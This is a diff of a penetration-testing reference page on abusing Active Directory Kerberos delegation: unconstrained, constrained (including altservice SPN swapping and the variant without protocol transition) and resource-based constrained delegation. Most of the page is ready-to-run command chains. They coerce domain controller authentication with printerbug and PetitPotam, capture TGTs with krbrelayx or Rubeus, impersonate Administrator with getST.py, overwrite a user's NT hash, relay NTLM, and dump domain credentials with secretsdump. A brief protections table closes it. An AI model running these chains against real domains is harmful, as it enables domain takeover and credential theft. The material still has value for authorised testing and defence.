@@ -1,146 +1,311 @@
 ---
 title: "Kerberos Delegation"
 ---
-Delegation allows a service to authenticate to other services on behalf of a user: designed to solve the double-hop problem (when service A needs to authenticate to service B as the original user). Misconfigurations in each delegation type create different privilege escalation paths.
 
-## Delegation Concepts
+Delegation solves the **double-hop problem**: when a user authenticates to Service A via Kerberos, Service A cannot forward that Kerberos identity to Service B on its own. The TGT never left the client. Delegation was designed to fix this, and each type has a different trust model and attack surface.
 
-**The double-hop problem:** A user authenticates to Server A via Kerberos. Server A cannot forward that Kerberos identity to Server B: the TGT never left the client. Delegation was designed to fix this.
+## S4U Extensions
 
-| Type | Controlled by | Scope |
-|------|--------------|-------|
-| Unconstrained | Computer account attribute (`TrustedForDelegation`) | Any service, any account |
-| Constrained | `msDS-AllowedToDelegateTo` on account | Specific SPNs only |
-| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` on **target** | Who can delegate **to** this computer |
+Two Kerberos extensions underpin all constrained delegation abuse:
 
-**S4U2Self:** Service requests a forwardable ticket to itself on behalf of any user: no password or prior auth from that user required.
+**S4U2Self (Service-for-User-to-Self):** Allows a service to request a forwardable service ticket to itself on behalf of any user, without that user's password or prior authentication. Requires the account to have an SPN.
 
-**S4U2Proxy:** Service uses a forwardable TGS from S4U2Self to request a ticket to another service: only allowed for SPNs listed in `msDS-AllowedToDelegateTo`.
+**S4U2Proxy (Service-for-User-to-Proxy):** Allows a service to use a forwardable TGS (obtained from S4U2Self or a real user auth) to request a ticket to a third service. On classic constrained delegation, the KDC validates the target SPN against `msDS-AllowedToDelegateTo`. On RBCD, the KDC validates the source against `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target.
+
+<Frame caption="How unconstrained and constrained delegation appear in Active Directory Users and Computers (Delegation tab)">
+  <img src="/images/active-directory/delegation/showcase-delegation.png" alt="Windows AD delegation tab showing unconstrained and constrained delegation options" />
+</Frame>
+
+## userAccountControl Bitmask
+
+Every AD object has a `userAccountControl` bitmask controlling account behaviour. Delegation-relevant flags:
+
+| Value | Flag | Meaning |
+|-------|------|---------|
+| `512` | `NORMAL_ACCOUNT` | Standard user account |
+| `4096` | `WORKSTATION_TRUST_ACCOUNT` | Machine account |
+| `524288` | `TRUSTED_FOR_DELEGATION` | Unconstrained delegation enabled |
+| `528384` | `4096 + 524288` | Machine account with unconstrained delegation |
+| `16777216` | `TRUSTED_TO_AUTH_FOR_DELEGATION` | Protocol transition (T2A4D) |
+
+```bash wrap
+# Set unconstrained delegation on a machine account you control
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object '$COMP_NAME' userAccountControl -v 528384
+```
+
+**SeEnableDelegationPrivilege:** Normally only Domain Admins can set delegation flags. This privilege grants that ability to non-admin accounts. If a low-priv user has it, they can set `TRUSTED_FOR_DELEGATION` on any account they control, without DA.
+
+---
 
 ## Unconstrained Delegation
 
-Any user who authenticates to an unconstrained delegation host sends their TGT along with the service ticket: the host stores it in LSASS. Compromise the host, wait for a privileged account to connect, extract the TGT.
+<Frame caption="Unconstrained delegation: the KDC embeds the user's full TGT in the service ticket. Service A extracts and caches it, then can impersonate the user against anything.">
+  <img src="/images/active-directory/delegation/unconstrained.png" alt="Unconstrained delegation flow" />
+</Frame>
 
-**Highest value:** Coerce the DC to authenticate to the unconstrained host: you get the DC machine account TGT, which can be used for DCSync.
+The service can impersonate the user against **any** service in the domain. Set via the `TRUSTED_FOR_DELEGATION` flag on the account. When a user authenticates to an unconstrained delegation host, the KDC embeds their full TGT in the service ticket. The host extracts and caches it in LSASS.
+
+**Attack goal:** coerce a privileged account (usually the DC machine account) into authenticating to the compromised host, extract its TGT, then DCSync.
+
+Accounts in the **Protected Users** group and accounts flagged **sensitive and cannot be delegated** have their TGTs excluded. Exception: the native Administrator (RID 500) bypasses this even if added to Protected Users.
+
+### Enumeration
+
+```bash wrap
+# bloodyAD
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap unconstrained
+
+# nxc
+nxc ldap $DC_IP -u $USER -p $PASSWORD --trusted-for-delegation
+```
 
 ```powershell wrap
-# Find unconstrained delegation hosts (excluding DCs: they have it by default)
-Get-DomainComputer -Unconstrained | Select-Object name, dnshostname
-Get-DomainUser -AllowDelegation | Select-Object samaccountname  # user accounts with unconstrained
+# PowerView (exclude DCs — they have it by default)
+Get-DomainComputer -Unconstrained | Where-Object { $_.distinguishedname -notmatch 'Domain Controllers' } | Select-Object name, dnshostname
+Get-DomainUser -AllowDelegation | Select-Object samaccountname
 ```
 
-```bash wrap
-# nxc
-nxc ldap $IP -u $USER -p $PASSWORD --trusted-for-delegation
-```
+### Exploitation (krbrelayx)
+
+The most reliable approach from Linux. You add an SPN to the compromised account pointing at your attacker host, register a DNS record for it, then coerce the DC to authenticate. krbrelayx captures the incoming AP-REQ and extracts the embedded TGT.
 
 ```bash wrap
-# Coerce DC to authenticate to the unconstrained host
-# (run from compromised host or attacker box)
-printerbug.py $DOMAIN/$USER:$PASSWORD@$DC_IP $IP
-PetitPotam.py -u $USER -p $PASSWORD $IP $DC_IP
+# Step 1: Add an SPN to the compromised account pointing at your listener
+# Salt format for computers: DOMAIN.LOCALhostfqdn.domain.local
+addspn.py -u '$DOMAIN\$COMP_NAME$' -p '$COMP_PASS' \
+  -s 'HOST/$LHOSTNAME.$DOMAIN' --additional $DC_HOST
+
+# Step 2: Add a DNS A record for your attacker hostname
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add dnsRecord '$LHOSTNAME.$DOMAIN' $LHOST
+
+# Wait ~3 minutes for DNS propagation, then verify
+nslookup $LHOSTNAME.$DOMAIN $DC_HOST
+
+# Step 3: Start krbrelayx with the compromised account's credentials or AES key
+krbrelayx.py --krbsalt '${DOMAIN^^}host$LHOSTNAME.$DOMAIN' --krbpass '$COMP_PASS'
+# or with AES256 key
+krbrelayx.py -aesKey $AES256_KEY
+
+# Step 4: Coerce DC authentication
+printerbug.py $DOMAIN/'$COMP_NAME$':$COMP_PASS@$DC_HOST $LHOSTNAME.$DOMAIN
+PetitPotam.py -u $USER -p $PASSWORD $LHOSTNAME.$DOMAIN $DC_HOST
+# If error: try coercing a different DC due to replication delays
+
+# Step 5: Export the captured TGT and DCSync
+export KRB5CCNAME=$(pwd)/DC01\$.ccache
+secretsdump.py -k -no-pass $DOMAIN/'DC01$'@$DC_HOST
 ```
+
+### Exploitation (Rubeus, Windows)
 
 ```powershell wrap
 # On the unconstrained delegation host: monitor for incoming TGTs
 Rubeus.exe monitor /interval:5 /nowrap
 
-# When DC TGT appears, use it
-Rubeus.exe ptt /ticket:<base64_ticket>
+# Coerce from another session
+.\Invoke-SpoolSample.ps1 $DC_HOST $COMPROMISED_HOST
 
-# Then DCSync
-secretsdump.py -k -no-pass $DOMAIN/DC01$@$DC_HOST
+# When the DC's TGT appears in Rubeus output, inject it
+Rubeus.exe ptt /ticket:<base64_TGT>
+
+# DCSync
+secretsdump.py -k -no-pass $DOMAIN/'DC01$'@$DC_HOST
 ```
+
+### Cleanup
+
+```bash wrap
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove dnsRecord '$LHOSTNAME.$DOMAIN' $LHOST
+```
+
+---
 
 ## Constrained Delegation
 
-The account has `msDS-AllowedToDelegateTo` set to a list of specific SPNs it can delegate to. If `TRUSTED_TO_AUTH_FOR_DELEGATION` flag is also set (T2A4D / protocol transition), the account can use S4U2Self for any user.
+<Frame caption="Constrained delegation: Service A can only impersonate users to the specific SPNs listed in msDS-AllowedToDelegateTo. With protocol transition (T2A4D), it can also use S4U2Self to get a forwardable ticket for any user without their password.">
+  <img src="/images/active-directory/delegation/constrained.png" alt="Constrained delegation flow" />
+</Frame>
+
+The account has `msDS-AllowedToDelegateTo` set to a specific list of SPNs it can delegate to. There are two sub-variants depending on whether **protocol transition** is enabled.
+
+### Enumeration
+
+```bash wrap
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap constrained
+nxc ldap $DC_IP -u $USER -p $PASSWORD --find-delegation
+```
 
 ```powershell wrap
-# Find constrained delegation accounts
 Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
 Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
 ```
 
+### With Protocol Transition (T2A4D flag set)
+
+`TRUSTED_TO_AUTH_FOR_DELEGATION` is set on the account. The service can call S4U2Self to obtain a forwardable ticket for **any** user without that user authenticating first, then feed it into S4U2Proxy.
+
 ```bash wrap
-# nxc
-nxc ldap $IP -u $USER -p $PASSWORD --find-delegation
+# Full impersonation: S4U2Self + S4U2Proxy in one step
+getST.py $DOMAIN/$SVC_ACCOUNT:$PASSWORD \
+  -spn cifs/$TARGET.$DOMAIN \
+  -impersonate Administrator \
+  -dc-ip $DC_IP
+
+export KRB5CCNAME="Administrator@cifs_$TARGET.${DOMAIN}@${DOMAIN^^}.ccache"
+psexec.py -k -no-pass Administrator@$TARGET.$DOMAIN
+secretsdump.py -k -no-pass $DOMAIN/Administrator@$TARGET.$DOMAIN
 ```
 
-```bash wrap
-# S4U2Proxy abuse: impersonate Administrator to delegated service
-getST.py $DOMAIN/svc_account:$PASSWORD \
-  -spn cifs/target.$DOMAIN \
-  -impersonate Administrator \
-  -dc-ip $IP
+### Without Protocol Transition
 
-export KRB5CCNAME="Administrator@cifs_target.$DOMAIN@${DOMAIN^^}.ccache"
-psexec.py -k -no-pass Administrator@target.$DOMAIN
+S4U2Self cannot produce a forwardable ticket on its own. Workaround: configure RBCD from the constrained delegation account to an attacker-controlled account, use that RBCD path to get a forwardable ticket, then feed it back into S4U2Proxy.
+
+```bash wrap
+# Step 1: Set RBCD on the constrained delegation account — allow EVIL$ to delegate to it
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add rbcd '$SVC_ACCOUNT' '$COMP_NAME'
+
+# Step 2: Get forwardable ticket via RBCD (S4U2Self + S4U2Proxy to svcAccount)
+getST.py $DOMAIN/'$COMP_NAME':$COMP_PASS \
+  -spn cifs/$SVC_ACCOUNT.$DOMAIN \
+  -impersonate Administrator \
+  -dc-ip $DC_IP
+
+# Step 3: Use that ticket as input to constrained delegation's S4U2Proxy
+getST.py $DOMAIN/$SVC_ACCOUNT:$PASSWORD \
+  -spn cifs/$TARGET.$DOMAIN \
+  -impersonate Administrator \
+  -additional-ticket "Administrator@cifs_$SVC_ACCOUNT.${DOMAIN}@${DOMAIN^^}.ccache" \
+  -dc-ip $DC_IP
+
+export KRB5CCNAME="Administrator@cifs_$TARGET.${DOMAIN}@${DOMAIN^^}.ccache"
+psexec.py -k -no-pass Administrator@$TARGET.$DOMAIN
 ```
 
 ### altservice: SPN Substitution
 
-If delegation rights exist to a low-value SPN (e.g., `time/target`), use `-altservice` to substitute the SPN in the ticket header. The KDC won't validate the final SPN against the allowed list at ticket use time: only the PAC is checked.
+If delegation rights exist to a low-value SPN (e.g., `time/target`), substitute it for a useful one. The KDC only checks the PAC at ticket-use time, not whether the SPN matches the allowed list.
 
 ```bash wrap
-# Delegation is to: time/target.domain.local
-# You want: cifs/target.domain.local
-
-getST.py $DOMAIN/svc_account:$PASSWORD \
-  -spn time/target.$DOMAIN \
+# Delegation is to: time/target.domain.local — swap it for cifs
+getST.py $DOMAIN/$SVC_ACCOUNT:$PASSWORD \
+  -spn time/$TARGET.$DOMAIN \
   -impersonate Administrator \
   -altservice cifs \
-  -dc-ip $IP
+  -dc-ip $DC_IP
 
-export KRB5CCNAME="Administrator@cifs_target.$DOMAIN@${DOMAIN^^}.ccache"
-smbexec.py -k -no-pass Administrator@target.$DOMAIN
+export KRB5CCNAME="Administrator@cifs_$TARGET.${DOMAIN}@${DOMAIN^^}.ccache"
+smbexec.py -k -no-pass Administrator@$TARGET.$DOMAIN
 ```
+
+---
 
 ## RBCD (Resource-Based Constrained Delegation)
 
-RBCD inverts the trust model: instead of the delegating account controlling where it can delegate, the **target** resource controls which accounts can act on its behalf via `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+<Frame caption="RBCD inverts the trust model: the target resource controls who can delegate to it via msDS-AllowedToActOnBehalfOfOtherIdentity. No Domain Admin needed to configure it — write access on the target object is enough.">
+  <img src="/images/active-directory/delegation/rbcd.png" alt="RBCD flow" />
+</Frame>
 
-**Conditions needed:**
-- Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer (via GenericAll, GenericWrite, or WriteProperty)
-- OR `CreateChild` on an OU containing the target (lets you create a new computer object)
-- A computer account you control (create one with `addcomputer.py` if MachineAccountQuota > 0)
+Instead of the source account controlling where it can delegate, the **target** resource defines which accounts it trusts to impersonate users to it. Set via `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target. Requires only write access to that attribute — no Domain Admin.
 
-**Full attack chain:**
+**Conditions:**
+- Write access on the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` (GenericAll, GenericWrite, WriteProperty)
+- A controlled account with an SPN — a machine account (sAMAccountName ending in `$`) or a user with an SPN set
+- DC functional level: Windows Server 2012+
+
+### Enumeration
 
 ```bash wrap
-# Step 1: Create a computer account (if needed)
-addcomputer.py $DOMAIN/$USER:$PASSWORD -computer-name '$COMP_NAME' -computer-pass $COMP_PASS
-
-# Check MachineAccountQuota (default is 10: most domains haven't changed this)
-nxc ldap $IP -u $USER -p $PASSWORD -M maq
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap s4u2proxy
+nxc ldap $DC_IP -u $USER -p $PASSWORD --find-delegation
 ```
 
+### Standard Attack Chain
+
 ```bash wrap
-# Step 2: Set RBCD on target: allow EVIL$ to act on behalf of any user to TARGET$
+# Step 1: Create a machine account if MachineAccountQuota > 0
+nxc ldap $DC_IP -u $USER -p $PASSWORD -M maq
+addcomputer.py $DOMAIN/$USER:$PASSWORD -computer-name '$COMP_NAME' -computer-pass $COMP_PASS -dc-ip $DC_IP
+
+# Step 2: Grant RBCD — tell TARGET$ to trust COMP_NAME$ to act on its behalf
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set object TARGET$ msDS-AllowedToActOnBehalfOfOtherIdentity \
-  -v '$COMP_NAME'
+  add rbcd 'TARGET$' '$COMP_NAME'
 
-# Verify
+# Verify the attribute was written
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object TARGET$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity
-```
+  get object 'TARGET$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
 
-```bash wrap
-# Alternative: set via LDAP shell (if you got one via Certipy or similar)
-# ldap_shell> set_rbcd TARGET$ EVIL$
-```
-
-```bash wrap
-# Step 3: Get service ticket impersonating Administrator to TARGET$
+# Step 3: S4U2Self + S4U2Proxy → get a ST impersonating Administrator to TARGET$
 getST.py $DOMAIN/'$COMP_NAME':$COMP_PASS \
   -spn cifs/TARGET.$DOMAIN \
   -impersonate Administrator \
-  -dc-ip $IP
+  -dc-ip $DC_IP
 
 # Step 4: Use the ticket
-export KRB5CCNAME="Administrator@cifs_TARGET.$DOMAIN@${DOMAIN^^}.ccache"
+export KRB5CCNAME="Administrator@cifs_TARGET.${DOMAIN}@${DOMAIN^^}.ccache"
 psexec.py -k -no-pass Administrator@TARGET.$DOMAIN
 wmiexec.py -k -no-pass Administrator@TARGET.$DOMAIN
 secretsdump.py -k -no-pass $DOMAIN/Administrator@TARGET.$DOMAIN
+
+# Step 5: Clean up
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  remove rbcd 'TARGET$' '$COMP_NAME'
 ```
+
+### SPN-less User (MachineAccountQuota = 0)
+
+When you can't create a machine account and have no existing SPN account, use a sacrificial user account via U2U (User-to-User authentication). This overwrites the account's NT hash, so it becomes unusable for normal auth afterwards — restore it immediately.
+
+```bash wrap
+# Step 1: Get a TGT for the sacrificial user via overpass-the-hash
+getTGT.py $DOMAIN/$SPN_LESS_USER -hashes :$(pypykatz crypto nt '$PASSWORD') -dc-ip $DC_IP
+export KRB5CCNAME=$(pwd)/$SPN_LESS_USER.ccache
+
+# Step 2: Extract the TGT session key
+describeTicket.py $SPN_LESS_USER.ccache | grep 'Ticket Session Key'
+
+# Step 3: Overwrite the user's NT hash with the TGT session key
+changepasswd.py -newhashes :$TGT_SESSION_KEY \
+  $DOMAIN/$SPN_LESS_USER:$PASSWORD@$DC_HOST
+
+# Step 4: Set RBCD from the spn-less user to TARGET$
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add rbcd 'TARGET$' '$SPN_LESS_USER'
+
+# Step 5: S4U2Self (U2U) + S4U2Proxy
+KRB5CCNAME=$SPN_LESS_USER.ccache getST.py \
+  -u2u -impersonate Administrator \
+  -spn host/TARGET.$DOMAIN \
+  -k -no-pass \
+  $DOMAIN/$SPN_LESS_USER -dc-ip $DC_IP
+
+# Step 6: Restore the original NT hash immediately
+changepasswd.py -hashes :$TGT_SESSION_KEY -newhashes :$ORIGINAL_HASH \
+  $DOMAIN/$SPN_LESS_USER@$DC_HOST
+
+# Step 7: Use the ticket
+export KRB5CCNAME="Administrator@host_TARGET.${DOMAIN}@${DOMAIN^^}.ccache"
+secretsdump.py -k -no-pass $DOMAIN/Administrator@TARGET.$DOMAIN
+```
+
+### Via NTLM Relay
+
+If you can relay an incoming NTLM auth from a privileged account, write RBCD directly during the relay without needing separate write access.
+
+```bash wrap
+ntlmrelayx.py -t ldap://$DC_HOST --delegate-access --escalate-user '$COMP_NAME$'
+```
+
+---
+
+## Protections
+
+| Protection | Effect |
+|-----------|--------|
+| `Protected Users` group | TGT not forwarded in delegation; S4U2Self blocked (except RID 500 Administrator) |
+| `Account is sensitive and cannot be delegated` | Cannot be impersonated via any delegation type |
+| `SeEnableDelegationPrivilege` absent | Low-priv users cannot set delegation flags even on accounts they create |
+| KB4577252 / CVE-2020-16996 | Patches S4U2Proxy validation bypass |
